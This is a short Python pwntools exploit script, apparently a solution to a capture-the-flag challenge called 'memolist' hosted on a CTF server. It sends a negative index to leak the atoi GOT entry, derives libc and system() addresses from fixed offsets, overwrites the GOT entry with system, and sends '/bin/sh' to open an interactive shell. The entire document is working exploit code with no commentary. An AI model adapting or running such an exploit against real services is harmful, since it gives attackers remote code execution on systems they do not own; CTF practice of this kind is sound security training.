from pwn import *
import time

r = remote("ctf.adl.tw", 11005)
# r = process("./memolist", env = {"LD_PRELOAD" : "./libc.so.6"})

r.recv()
time.sleep(1)
r.sendline("1")
time.sleep(1)
r.recv()
time.sleep(1)
r.sendline("-4")
time.sleep(1)
r.recvuntil(": ")
atoi = u64(r.recv(6).ljust(8, "\x00"))
libc = atoi - 0x36e80
system = libc + 0x45390


r.recv()
r.sendline("2")
r.recv()
r.sendline("-4")
r.recv()
r.sendline(p64(system))

r.recv()
r.sendline("/bin/sh")
r.recv()

r.interactive()
